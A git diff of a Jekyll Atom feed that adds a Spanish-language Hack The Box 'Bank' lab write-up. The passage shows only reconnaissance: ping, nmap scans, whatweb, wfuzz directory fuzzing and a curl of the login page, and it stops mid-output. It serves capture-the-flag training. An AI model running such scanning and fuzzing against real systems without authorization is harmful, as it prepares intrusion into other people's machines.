@@ -1,4 +1,391 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2022-02-27T22:45:44-06:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">K4miyo | Ciberseguridad!</title><subtitle>Artículos relacinados al hacking ético en diferentes plataformas</subtitle><author><name>K4miyo</name></author><entry><title type="html">Hack The Box SwagShop</title><link href="http://localhost:4000/htb-swagshop/" rel="alternate" type="text/html" title="Hack The Box SwagShop" /><published>2022-02-27T00:00:00-06:00</published><updated>2022-02-27T00:00:00-06:00</updated><id>http://localhost:4000/htb-swagshop</id><content type="html" xml:base="http://localhost:4000/htb-swagshop/">&lt;p&gt;&lt;img src=&quot;/assets/images/htb-swagshop/banner-swagshop.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2022-02-28T13:40:36-06:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">K4miyo | Ciberseguridad!</title><subtitle>Artículos relacinados al hacking ético en diferentes plataformas</subtitle><author><name>K4miyo</name></author><entry><title type="html">Hack The Box Bank</title><link href="http://localhost:4000/htb-bank/" rel="alternate" type="text/html" title="Hack The Box Bank" /><published>2022-02-28T00:00:00-06:00</published><updated>2022-02-28T00:00:00-06:00</updated><id>http://localhost:4000/htb-bank</id><content type="html" xml:base="http://localhost:4000/htb-bank/">&lt;p&gt;&lt;img src=&quot;/assets/images/htb-bank/banner-bank.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;bank&quot;&gt;Bank&lt;/h2&gt;
+&lt;p&gt;Se procede con la fase de reconocimiento lanzando primeramente un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ping&lt;/code&gt; a la dirección IP 10.10.10.29.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ ping &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; 1 10.10.10.29
+PING 10.10.10.29 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.10.10.29&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 56&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;84&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; bytes of data.
+64 bytes from 10.10.10.29: &lt;span class=&quot;nv&quot;&gt;icmp_seq&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1 &lt;span class=&quot;nv&quot;&gt;ttl&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;63 &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;132 ms
+
+&lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt; 10.10.10.29 ping statistics &lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;
+1 packets transmitted, 1 received, 0% packet loss, &lt;span class=&quot;nb&quot;&gt;time &lt;/span&gt;0ms
+rtt min/avg/max/mdev &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 132.094/132.094/132.094/0.000 ms
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;De acuerdo con el TTL de traza ICMP, se puede determinar que se trata de una máquina con sistema operativo Linux. A continuación se procede con la ejecución de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt; para determinar los puertos abiertos de la máquina y exportanto la información al archivo &lt;strong&gt;allPorts&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nmap &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--open&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-T5&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; 10.10.10.29 &lt;span class=&quot;nt&quot;&gt;-oG&lt;/span&gt; allPorts
+Starting Nmap 7.92 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2022-02-28 12:03 CST
+Initiating Ping Scan at 12:03
+Scanning 10.10.10.29 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;4 ports]
+Completed Ping Scan at 12:03, 0.16s elapsed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 total hosts&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Initiating SYN Stealth Scan at 12:03
+Scanning 10.10.10.29 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;65535 ports]
+Discovered open port 22/tcp on 10.10.10.29
+Discovered open port 53/tcp on 10.10.10.29
+Discovered open port 80/tcp on 10.10.10.29
+Completed SYN Stealth Scan at 12:03, 35.63s elapsed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;65535 total ports&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.29
+Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.13s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+Not shown: 65532 closed tcp ports &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;reset&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+PORT   STATE SERVICE
+22/tcp open  ssh
+53/tcp open  domain
+80/tcp open  http
+
+Read data files from: /usr/bin/../share/nmap
+Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;35.91 seconds
+           Raw packets sent: 67798 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2.983MB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; | Rcvd: 67772 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2.711MB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Mediante la función &lt;a href=&quot;/extractPorts&quot;&gt;extractPorts&lt;/a&gt; definida a nivel de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;zsh&lt;/code&gt; , se obtiene la información más relevante de la captura grepeable.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ extractPorts allPorts
+───────┬─────────────────────────────────────
+       │ File: extractPorts.tmp
+       │ Size: 119 B
+───────┼─────────────────────────────────────
+   1   │ 
+   2   │ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Extracting information...
+   3   │ 
+   4   │     &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; IP Address: 10.10.10.29
+   5   │     &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Open ports: 22,53,80
+   6   │ 
+   7   │ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Ports copied to clipboard
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;A continuación se lanza una serie de scripts para determinar el servicio y versión que corren para los puertos detectados.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nmap &lt;span class=&quot;nt&quot;&gt;-sCV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p22&lt;/span&gt;,53,80 10.10.10.29 &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt; targeted
+Starting Nmap 7.92 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2022-02-28 12:04 CST
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.29
+Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.14s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+| ssh-hostkey: 
+|   1024 08:ee:d0:30:d5:45:e4:59:db:4d:54:a8:dc:5c:ef:15 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;DSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|   2048 b8:e0:15:48:2d:0d:f0:f1:73:33:b7:81:64:08:4a:91 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|   256 a0:4c:94:d1:7b:6e:a8:fd:07:fe:11:eb:88:d5:16:65 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|_  256 2d:79:44:30:c8:bb:5e:8f:07:cf:5b:72:ef:a1:6d:67 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ED25519&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+53/tcp open  domain  ISC BIND 9.9.5-3ubuntu0.14 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+| dns-nsid: 
+|_  bind.version: 9.9.5-3ubuntu0.14-Ubuntu
+80/tcp open  http    Apache httpd 2.4.7 &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
+|_http-server-header: Apache/2.4.7 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|_http-title: Apache2 Ubuntu Default Page: It works
+Service Info: OS: Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;16.63 seconds
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Vemos el puerto 80 abierto, por lo que antes de visualizar el contenido vía web, vamos a ver a lo que nos enfrentamos con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;whatweb&lt;/code&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ whatweb http://10.10.10.29/
+http://10.10.10.29/ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;200 OK] Apache[2.4.7], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.7 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)]&lt;/span&gt;, IP[10.10.10.29], Title[Apache2 Ubuntu Default Page: It works]
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Vemos que nos encontramos con la página default de Apache2. Algo que vemos es que se encuentra abierto el puerto 53, por lo que podríamos pensar que se está aplicando &lt;strong&gt;&lt;em&gt;Virtual hosting&lt;/em&gt;&lt;/strong&gt;; asi que dentro de nuestro archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; vamos a agregar la dirección IP con el dominio &lt;strong&gt;bank.htb&lt;/strong&gt; y cargar la página bajo dicho dominio a ver si vemos otra cosa.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-bank/bank-web.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Nos encontramos con un panel de login en el cual podríamos tratar de hace inyecciones SQL, Padding Oracle Attack, fuerza bruta, etc. Sin embargo, no nos va a funcionar. Algo que podemos notar es que se tiene el recurso &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;login.php&lt;/code&gt;; por lo tanto podríamos tratar de descubrir más recursos de extensión php:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ wfuzz &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--hc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;404 &lt;span class=&quot;nt&quot;&gt;--hh&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;7322 &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://bank.htb/FUZZ.php
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz&lt;span class=&quot;s1&quot;&gt;'s documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://bank.htb/FUZZ.php
+Total requests: 220560
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                         
+=====================================================================
+
+000000014:   403        10 L     30 W       279 Ch      &quot;http://bank.htb/.php&quot;                                          
+000000053:   200        51 L     125 W      1974 Ch     &quot;login&quot;                                                         
+000000055:   302        83 L     186 W      3291 Ch     &quot;support&quot;                                                       
+^C /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:80: UserWarning:Finishing pending requests...
+
+Total time: 7.929055
+Processed Requests: 374
+Filtered Requests: 371
+Requests/sec.: 47.16829
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Vemos el recurso &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;support.php&lt;/code&gt; que tiene un código de estado 302, así que aplicaremos el parámetro &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-L&lt;/code&gt; para ver a donde nos redirige.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ wfuzz &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--hc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;404 &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://bank.htb/FUZZ.php
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz&lt;span class=&quot;s1&quot;&gt;'s documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://bank.htb/FUZZ.php
+Total requests: 220560
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                         
+=====================================================================
+
+000000001:   200        51 L     125 W      1974 Ch     &quot;# directory-list-2.3-medium.txt&quot;                               
+000000003:   200        51 L     125 W      1974 Ch     &quot;# Copyright 2007 James Fisher&quot;                                 
+000000007:   200        51 L     125 W      1974 Ch     &quot;# license, visit http://creativecommons.org/licenses/by-sa/3.0/
+                                                        &quot;                                                               
+000000015:   200        51 L     125 W      1974 Ch     &quot;index&quot;                                                         
+000000014:   403        10 L     30 W       279 Ch      &quot;http://bank.htb/.php&quot;                                          
+000000013:   200        51 L     125 W      1974 Ch     &quot;#&quot;                                                             
+000000012:   200        51 L     125 W      1974 Ch     &quot;# on atleast 2 different hosts&quot;                                
+000000002:   200        51 L     125 W      1974 Ch     &quot;#&quot;                                                             
+000000011:   200        51 L     125 W      1974 Ch     &quot;# Priority ordered case sensative list, where entries were foun
+                                                        d&quot;                                                              
+000000010:   200        51 L     125 W      1974 Ch     &quot;#&quot;                                                             
+000000009:   200        51 L     125 W      1974 Ch     &quot;# Suite 300, San Francisco, California, 94105, USA.&quot;           
+000000008:   200        51 L     125 W      1974 Ch     &quot;# or send a letter to Creative Commons, 171 Second Street,&quot;    
+000000006:   200        51 L     125 W      1974 Ch     &quot;# Attribution-Share Alike 3.0 License. To view a copy of this&quot; 
+000000005:   200        51 L     125 W      1974 Ch     &quot;# This work is licensed under the Creative Commons&quot;            
+000000004:   200        51 L     125 W      1974 Ch     &quot;#&quot;                                                             
+000000053:   200        51 L     125 W      1974 Ch     &quot;login&quot;                                                         
+000000055:   200        51 L     125 W      1974 Ch     &quot;support&quot;                                                       
+^C /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:80: UserWarning:Finishing pending requests...
+
+Total time: 8.147257
+Processed Requests: 373
+Filtered Requests: 356
+Requests/sec.: 45.78227
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Si nos fijamos en la cantidad de caracteres del recurso &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;support.php&lt;/code&gt; con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;login.php&lt;/code&gt; vemos que son lo mismo; por lo que es posible que &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;support.php&lt;/code&gt; nos redirija a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;login.php&lt;/code&gt; y lo podemos comprar vía web. Aquí lo que nos importa es ver el contenido de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;support.php&lt;/code&gt;, así que vamos a hacer uso de la herramienta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;curl&lt;/code&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ curl &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; http://bank.htb/login.php
+                                                                                                                                 
+&amp;lt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;DOCTYPE html&amp;gt;       
+&amp;lt;html&amp;gt;                                                                                                                           
+  &amp;lt;&lt;span class=&quot;nb&quot;&gt;head&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;           
+    &amp;lt;title&amp;gt;HTB Bank - Login&amp;lt;/title&amp;gt;                                                                                              
+    &amp;lt;meta &lt;span class=&quot;nv&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;viewport&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;content&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;width=device-width, initial-scale=1.0&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+    &amp;lt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt; Bootstrap &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;   
+    &amp;lt;&lt;span class=&quot;nb&quot;&gt;link &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;href&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;./assets/css/bootstrap.min.css&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;rel&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;stylesheet&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+    &amp;lt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt; styles &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;           
+    &amp;lt;&lt;span class=&quot;nb&quot;&gt;link &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;href&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;./assets/css/theme/styles.css&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;rel&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;stylesheet&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 
+  &amp;lt;/head&amp;gt;                                                       
+  &amp;lt;body &lt;span class=&quot;nv&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;login-bg&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;    
+    &amp;lt;div &lt;span class=&quot;nv&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;header&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;                                        
+       &amp;lt;div &lt;span class=&quot;nv&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;container&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;                                  
+          &amp;lt;div &lt;span class=&quot;nv&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;row&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+             &amp;lt;div &lt;span class=&quot;nv&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;col-md-12&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+                &amp;lt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt; Logo &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+                &amp;lt;div &lt;span class=&quot;nv&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;logo&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+                   &amp;lt;h1&amp;gt;&amp;lt;a &lt;span class=&quot;nv&quot;&gt;href&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;index.html&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;HTB Bank&amp;lt;/a&amp;gt;&amp;lt;/h1&amp;gt;
+                &amp;lt;/div&amp;gt;
+             &amp;lt;/div&amp;gt;                                             
+          &amp;lt;/div&amp;gt;     
+       &amp;lt;/div&amp;gt;                                                   
+  &amp;lt;/div&amp;gt;                                                        
+                                
+  &amp;lt;div &lt;span class=&quot;nv&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;page-content container&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;      
+    &amp;lt;div &lt;span class=&quot;nv&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;row&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;                                           
+      &amp;lt;div &lt;span class=&quot;nv&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;col-md-4 col-md-offset-4&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;                                                                                     
+        &amp;lt;div &lt;span class=&quot;nv&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;login-wrapper&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;                                                                                              
+              &amp;lt;div &lt;span class=&quot;nv&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;box&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;                                                                                                  
+                  &amp;lt;div &lt;span class=&quot;nv&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;content-wrap&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+                      &amp;lt;h6&amp;gt;Login&amp;lt;/h6&amp;gt;                                                                                             
+                                            &amp;lt;form &lt;span class=&quot;nv&quot;&gt;method&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;post&quot;&lt;/span&gt; action&amp;gt;
+                        &amp;lt;input &lt;span class=&quot;nv&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;form-control&quot;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;text&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;inputEmail&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;placeholder&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;E-mail address&quot;&lt;/span&gt; required&amp;gt;
